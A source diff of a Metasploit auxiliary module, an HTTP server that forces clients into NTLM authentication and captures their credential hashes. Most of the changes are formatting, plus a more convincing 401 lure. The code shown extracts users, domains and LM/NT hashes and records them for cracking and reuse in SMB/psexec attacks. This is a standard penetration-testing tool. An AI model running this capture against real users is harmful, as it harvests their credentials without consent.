@@ -1,8 +1,6 @@
 ##
-# This file is part of the Metasploit Framework and may be subject to
-# redistribution and commercial restrictions. Please see the Metasploit
-# web site for more information on licensing and terms of use.
-#   http://metasploit.com/
+# This module requires Metasploit: http://metasploit.com/download
+# Current source: https://github.com/rapid7/metasploit-framework
 ##
 
 require 'msf/core'
@@ -60,7 +58,7 @@ class Metasploit3 < Msf::Auxiliary
   end
 
   def on_request_uri(cli, request)
-    print_status("Request '#{request.uri}'...")
+    vprint_status("Request '#{request.uri}'")
 
     case request.method
     when 'OPTIONS'
@@ -68,10 +66,16 @@ class Metasploit3 < Msf::Auxiliary
     else
       # If the host has not started auth, send 401 authenticate with only the NTLM option
       if(!request.headers['Authorization'])
+        vprint_status("401 '#{request.uri}'")
         response = create_response(401, "Unauthorized")
         response.headers['WWW-Authenticate'] = "NTLM"
+        response.headers['Proxy-Support'] = 'Session-Based-Authentication'
+        response.body =
+          "<HTML><HEAD><TITLE>You are not authorized to view this page</TITLE></HEAD></HTML>"
+
         cli.send_response(response)
       else
+        vprint_status("Continuing auth '#{request.uri}'")
         method,hash = request.headers['Authorization'].split(/\s+/,2)
         # If the method isn't NTLM something odd is goign on. Regardless, this won't get what we want, 404 them
         if(method != "NTLM")
@@ -114,7 +118,7 @@ class Metasploit3 < Msf::Auxiliary
   end
 
   def handle_auth(cli,hash)
-    #authorization string is base64 encoded message
+    # authorization string is base64 encoded message
     message = Rex::Text.decode_base64(hash)
 
     if(message[8,1] == "\x01")
@@ -138,13 +142,13 @@ class Metasploit3 < Msf::Auxiliary
       response.headers['WWW-Authenticate'] = "NTLM " + chalhash
       return response
 
-    #if the message is a type 3 message, then we have our creds
+    # if the message is a type 3 message, then we have our creds
     elsif(message[8,1] == "\x03")
       domain,user,host,lm_hash,ntlm_hash = MESSAGE.process_type3_message(hash)
       nt_len = ntlm_hash.length
 
       if nt_len == 48 #lmv1/ntlmv1 or ntlm2_session
-        arg = {	:ntlm_ver => NTLM_CONST::NTLM_V1_RESPONSE,
+        arg = { :ntlm_ver => NTLM_CONST::NTLM_V1_RESPONSE,
           :lm_hash => lm_hash,
           :nt_hash => ntlm_hash
         }
@@ -152,14 +156,14 @@ class Metasploit3 < Msf::Auxiliary
         if arg[:lm_hash][16,32] == '0' * 32
           arg[:ntlm_ver] = NTLM_CONST::NTLM_2_SESSION_RESPONSE
         end
-      #if the length of the ntlm response is not 24 then it will be bigger and represent
+      # if the length of the ntlm response is not 24 then it will be bigger and represent
       # a ntlmv2 response
       elsif nt_len > 48 #lmv2/ntlmv2
-        arg = {	:ntlm_ver 		=> NTLM_CONST::NTLM_V2_RESPONSE,
-          :lm_hash 		=> lm_hash[0, 32],
-          :lm_cli_challenge 	=> lm_hash[32, 16],
-          :nt_hash 		=> ntlm_hash[0, 32],
-          :nt_cli_challenge 	=> ntlm_hash[32, nt_len  - 32]
+        arg = { :ntlm_ver   => NTLM_CONST::NTLM_V2_RESPONSE,
+          :lm_hash   => lm_hash[0, 32],
+          :lm_cli_challenge  => lm_hash[32, 16],
+          :nt_hash   => ntlm_hash[0, 32],
+          :nt_cli_challenge  => ntlm_hash[32, nt_len  - 32]
         }
       elsif nt_len == 0
         print_status("Empty hash from #{host} captured, ignoring ... ")
@@ -304,8 +308,8 @@ class Metasploit3 < Msf::Auxiliary
           "NTHASH:#{nt_hash ? nt_hash : "<NULL>"} " +
           "NT_CLIENT_CHALLENGE:#{nt_cli_challenge ? nt_cli_challenge : "<NULL>"}\n"
       when NTLM_CONST::NTLM_2_SESSION_RESPONSE
-        #we can consider those as netv1 has they have the same size and i cracked the same way by cain/jtr
-        #also 'real' netv1 is almost never seen nowadays except with smbmount or msf server capture
+        # we can consider those as netv1 has they have the same size and i cracked the same way by cain/jtr
+        # also 'real' netv1 is almost never seen nowadays except with smbmount or msf server capture
         smb_db_type_hash = "smb_netv1_hash"
         capturelogmessage =
           "#{capturedtime}\nNTLM2_SESSION Response Captured from #{host} \n" +
@@ -320,7 +324,7 @@ class Metasploit3 < Msf::Auxiliary
       print_status(capturelogmessage)
 
       # DB reporting
-      # Rem :  one report it as a smb_challenge on port 445 has breaking those hashes
+      # Rem : one report it as a smb_challenge on port 445 has breaking those hashes
       # will be mainly use for psexec / smb related exploit
       report_auth_info(
         :host  => ip,
@@ -337,7 +341,7 @@ class Metasploit3 < Msf::Auxiliary
         :active => true
       )
       #if(datastore['LOGFILE'])
-      #	File.open(datastore['LOGFILE'], "ab") {|fd| fd.puts(capturelogmessage + "\n")}
+      #  File.open(datastore['LOGFILE'], "ab") {|fd| fd.puts(capturelogmessage + "\n")}
       #end
 
       if(datastore['CAINPWFILE'] and user)
